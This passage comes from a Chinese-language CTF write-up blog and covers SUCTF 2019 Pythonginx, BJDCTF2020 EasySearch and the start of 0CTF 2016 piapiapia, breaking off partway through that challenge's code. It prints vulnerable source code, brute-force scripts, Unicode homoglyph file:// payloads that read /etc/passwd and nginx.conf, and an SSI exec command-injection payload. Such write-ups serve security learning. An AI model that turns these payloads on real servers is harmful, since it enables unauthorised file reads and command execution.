src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666337363647-63c7d60e-0888-40d0-b510-17ce3ced0104.png#averageHue=%23f6f5f5&clientId=u0dd2d63b-66d0-4&from=paste&height=270&id=u616985ab&name=image.png&originHeight=338&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42754&status=done&style=none&taskId=u198550b5-f529-4b8a-a3fd-eebe5cb1ad0&title=&width=901.6" alt="image.png"><br>也可以得出答案（这里换百分号还是写个脚本吧诶）</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>考点：unicode欺骗，代码审计，nginx<br>进入即可获得源码；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">getUrl</span>():</span><br><span class="line">    url = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.<span class="title function_ invoke__">urlparse</span>(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="keyword">list</span>(<span class="title function_ invoke__">urlsplit</span>(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.<span class="title function_ invoke__">append</span>(h.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;idna&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#unicode变ascii</span></span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.<span class="title function_ invoke__">join</span>(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = <span class="title function_ invoke__">urlunsplit</span>(parts).<span class="title function_ invoke__">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.<span class="title function_ invoke__">urlparse</span>(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.<span class="title function_ invoke__">urlopen</span>(finalUrl).<span class="title function_ invoke__">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>
<p>一眼flask框架，这是一些路由和函数<br>首先呢关于urlsplit函数我记得之前分享过一篇文章：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666409967184-e1711ecd-ef93-42c5-81a6-1602fac72263.png#averageHue=%23ecfdca&clientId=u43c11e22-67d5-4&from=paste&height=394&id=ub59bad2e&name=image.png&originHeight=493&originWidth=1079&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90584&status=done&style=none&taskId=uae8916fa-aa56-46ba-a849-8db10490615&title=&width=863.2" alt="image.png"><br>urlsplit:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410053872-bb73f45a-664b-4d4e-88e0-18e62f1e0989.png#averageHue=%23faf9f9&clientId=u43c11e22-67d5-4&from=paste&height=543&id=u0d77f372&name=image.png&originHeight=679&originWidth=1452&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100962&status=done&style=none&taskId=u48eafba0-3a46-49b7-860d-7baa88f87bb&title=&width=1161.6" alt="image.png"><br>urlunsplit:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410100371-6415a7e3-1fdf-4773-8c86-14562a089dc2.png#averageHue=%23f6f4f2&clientId=u43c11e22-67d5-4&from=paste&height=114&id=u40274124&name=image.png&originHeight=143&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30235&status=done&style=none&taskId=u6b31e0e0-c6b3-4ea9-801f-67d5e57e3e0&title=&width=996.8" alt="image.png"><br>也就再次缝合起来</p>
<p>大致的意思理解了，先用unicode欺骗去绕过前两个判断，然后读取文件，先用以下脚本跑出unicode字符：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">	tmp=<span class="title function_ invoke__">chr</span>(i)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res = tmp.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;idna&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) in res:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; &quot;</span>.<span class="title function_ invoke__">format</span>(tmp,res,i))</span><br><span class="line">	except:</span><br><span class="line">		pass</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410498393-572a06d2-6170-43b9-87cb-f297afafb76d.png#averageHue=%23312f2e&clientId=u43c11e22-67d5-4&from=paste&height=83&id=u21cb097d&name=image.png&originHeight=104&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12996&status=done&style=none&taskId=u40023c3e-b5af-4502-a57e-dfe0d1227c2&title=&width=266.4" alt="image.png"><br>在结果中找转换后为c的，最后payload如下：<br><code>?url=file://suctf.cⅽ/../../../../etc/passwd</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410521863-f287b309-aad2-40b9-b384-34be789685e5.png#averageHue=%23f2f2f1&clientId=u43c11e22-67d5-4&from=paste&height=316&id=u4b7b2423&name=image.png&originHeight=395&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27533&status=done&style=none&taskId=u1a29ce0a-bc7b-40d7-aa2e-a6c533018e0&title=&width=796" alt="image.png"><br>成功读取文件，题目提示nginx，那就看看配置文件：<br><code>?url=file://suctf.cⅽ/../../../../usr/local/nginx/conf/nginx.conf</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410541200-5bf9fbaf-237d-4ba8-9054-89d0c684d972.png#averageHue=%23fafafa&clientId=u43c11e22-67d5-4&from=paste&height=254&id=u9bf3b1c1&name=image.png&originHeight=317&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9512&status=done&style=none&taskId=u3630e938-90b4-47f0-99b9-b4a3c3ea3b7&title=&width=548" alt="image.png"><br>flag在<code>/usr/fffffflag</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410553916-34e2aa13-fff8-4d5d-967a-1ab95b0d451f.png#averageHue=%23f8f8f8&clientId=u43c11e22-67d5-4&from=paste&height=108&id=u50085e21&name=image.png&originHeight=135&originWidth=566&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4100&status=done&style=none&taskId=u58c1f905-cc66-45a0-9bf0-da26e08d988&title=&width=452.8" alt="image.png"><br>读取即可</p>
<p>还有第二种做法，那就是用<code>//去绕过判断</code>:<br>parse是解析URL的。PHP上parse能通过&#x2F;来干扰解码结果，python中也可以<br>当url为file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>前两个解析结果为NULL，最后解析为suctf。同样绕过了判断<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666410601119-99cd21c7-547d-4d34-8871-c8bd2b85f8b8.png#averageHue=%2306151e&clientId=u43c11e22-67d5-4&from=paste&id=u5da98980&name=image.png&originHeight=462&originWidth=1295&originalType=url&ratio=1&rotation=0&showTitle=false&size=395258&status=done&style=none&taskId=u4ca6b61d-4fa7-4d04-9bf1-df690157d69&title=" alt="image.png"><br>参考：</p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>只能说是buu靶场的问题了，这种要扫目录的题我建议就是直接别设置线程啊，那我设到1线程我扫半年啊</p>
<p>dirsearch扫目录发现是泄露了<code>index.php.swp</code>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个代码审计应该不难吧？应该不难吧？应该不难吧？应该不难吧？应该不难吧？应该不难吧？<br>admin写死了，所以要跑个脚本，把md5后前六位是<code>6d0bc1</code>找出来！：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    j=<span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    a=hashlib.<span class="title function_ invoke__">md5</span>(j.<span class="title function_ invoke__">encode</span>(<span class="string">&quot;utf-8&quot;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    <span class="comment"># print(a[0:6])</span></span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">print</span>(a)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;find it！&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666421707920-10995843-0b9f-42b3-be26-1d1e9e235abc.png#averageHue=%232d2c2c&clientId=u273f9a09-1b43-4&from=paste&height=190&id=u3e30b76a&name=image.png&originHeight=237&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22796&status=done&style=none&taskId=ud6eb2901-b3c0-47a8-b83a-a1425175292&title=&width=648" alt="image.png"><br>这三个随便选好吧，这边admin是个变量不是我们post传的参数，我们用户名随便写一个登入进去：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666421760294-e1c4258b-4c43-4075-b002-1d224b96fac5.png#averageHue=%23ebc68e&clientId=u273f9a09-1b43-4&from=paste&height=181&id=u49832030&name=image.png&originHeight=226&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30689&status=done&style=none&taskId=u97a7db33-ee23-4b78-803f-fe3fb399b06&title=&width=1200" alt="image.png"><br>在标头里找到了shtml文件的位置，访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666421779697-e18be432-7118-479f-8160-5cdc01a21859.png#averageHue=%23f7f6f6&clientId=u273f9a09-1b43-4&from=paste&height=246&id=u4255feb3&name=image.png&originHeight=308&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25586&status=done&style=none&taskId=u362ce432-1d97-4846-b8ab-68754709070&title=&width=869.6" alt="image.png"><br>这边kino就是我们可以控制的值，也就是username啦~<br>这里讲一下什么是<code>shtml文件</code>，什么是<code>ssi</code>注入</p>
<blockquote>
<p>SHTML文件（以.shtml文件扩展名的文件）和HTML文件差不多，都是网页文件，只是SHTML文件中有服务器端包含（server-side includes，SSI）指令。它在发送到用户浏览器之前由web服务器进行处理（或解析）——把SHTML文件中包含的SSI指令解释出来，服务器传送给客户端的文件，是已经解释的SHTML，不会有SSI指令——它实现了HTML所没有的功能。</p>
<p>Web 服务器在处理网页的同时处理 SSI 指令。当 Web 服务器（目前最主流的三个Web服务器是Apache、 Nginx 、IIS）遇到 SSI 指令时，直接将包含文件的内容插入 HTML 网页。如果“包含文件”中包含 SSI 指令，则同时插入此文件。除了用于包含文件的基本指令之外，还可以使用 SSI 指令插入文件的相关信息（如文件的大小）或者运行应用程序或 shell 命令。</p>
<p>网站维护常常碰到的一个问题是，网站的结构已经固定，却为了更新一点内容而不得不重做一大批网页。SSI提供了一种简单、有效的方法来解决这一问题，它将一个网站的基本结构放在几个简单的HTML文件中（模板），以后我们要做的只是将文本传到服务器，让程序按照模板自动生成网页，从而使管理大型网站变得容易。</p>
</blockquote>
<p>长话短说shtml也就是解析ssi指令的一个类似HTML网页文件：<br>SSI常用指令：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422075923-ac733745-83d4-4a63-ad05-296d6a2e14d2.png#averageHue=%23fcfcfb&clientId=u273f9a09-1b43-4&from=paste&height=356&id=ue2fe2fe0&name=image.png&originHeight=445&originWidth=682&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29722&status=done&style=none&taskId=ud8250e8b-50c6-4448-b0d7-5b90056396f&title=&width=545.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422098463-719ebef3-d3a1-4bac-be62-d2ed21b699d5.png#averageHue=%23fcfbfa&clientId=u273f9a09-1b43-4&from=paste&height=416&id=u8858ed4f&name=image.png&originHeight=520&originWidth=1123&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59608&status=done&style=none&taskId=u17fbc480-0d60-463c-8385-e97a937ad06&title=&width=898.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422112965-e63c85e5-5ed3-4346-a9e2-5c97a5f1b59e.png#averageHue=%23fbfafa&clientId=u273f9a09-1b43-4&from=paste&height=300&id=u11ad5467&name=image.png&originHeight=375&originWidth=657&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29003&status=done&style=none&taskId=uc2d2a4af-731a-4ac6-9df4-e3d9a8e7964&title=&width=525.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422121594-596778d3-3db0-422a-a3b1-4a2d83023901.png#averageHue=%23faf9f8&clientId=u273f9a09-1b43-4&from=paste&height=132&id=ud248f5d3&name=image.png&originHeight=165&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18342&status=done&style=none&taskId=u380d86ec-3597-46d4-afe1-d9d9fa2642a&title=&width=585.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422127181-98d698a6-0f3a-4d4d-a99c-ae1fbd03a430.png#averageHue=%23fdfcfb&clientId=u273f9a09-1b43-4&from=paste&height=620&id=u241a260b&name=image.png&originHeight=775&originWidth=1054&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61887&status=done&style=none&taskId=ue13deb7a-c17d-4f32-aded-0427b03c85e&title=&width=843.2" alt="image.png"><br>简单例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;SSI example&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;新闻&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;!--<span class="comment">#include file=&quot;news.txt&quot;--&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;p&gt;最后一次更新更新日期：&lt;!--<span class="comment">#flastmod file=&quot;news.txt&quot; --&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#config timefmt=&quot;%Y-%m-%d %H:%M&quot;--&gt;</span></span><br><span class="line">&lt;p&gt;最后一次更新更新日期（使用了格式）：&lt;!--<span class="comment">#config timefmt=&quot;%Y-%m-%d %H:%M&quot;--&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#flastmod file=&quot;news.txt&quot; --&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>这边我们要利用的指令也就是exec，来进行远程rce<br>用户名输入<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</code>，密码输入<code>2020666</code>，然后同样的来到刚刚的页面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666422208713-12cfec40-2828-4f7f-aafd-eba344b388ec.png#averageHue=%23f5f4f4&clientId=u273f9a09-1b43-4&from=paste&height=326&id=ub83511e2&name=image.png&originHeight=407&originWidth=1282&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36442&status=done&style=none&taskId=u01df7e1e-7664-404e-9c2b-8c83d29d86b&title=&width=1025.6" alt="image.png"></p>
<h2 id="0CTF-2016-piapiapia（反序列化字符逃逸）"><a href="#0CTF-2016-piapiapia（反序列化字符逃逸）" class="headerlink" title="[0CTF 2016]piapiapia（反序列化字符逃逸）"></a>[0CTF 2016]piapiapia（反序列化字符逃逸）</h2><p>考点：代码审计，反序列化参数逃逸<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666549152140-64995098-d92c-4bcd-8da6-56e7abe3383a.png#averageHue=%23fdfdfc&clientId=ua3ff2799-afb0-4&from=paste&height=522&id=ud1940f55&name=image.png&originHeight=652&originWidth=1543&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63403&status=done&style=none&taskId=u85836424-0ca3-4d6f-a787-474218c9f3e&title=&width=1234.4" alt="image.png"></p>
<p>访问<a href="http://www.zip发现有信息泄露，下载下来是一个文件夹，里面有6个php文件：">www.zip发现有信息泄露，下载下来是一个文件夹，里面有6个php文件：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的一看就是一个配置文件，flag似乎被摸出了，所以config.php文件中有flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span 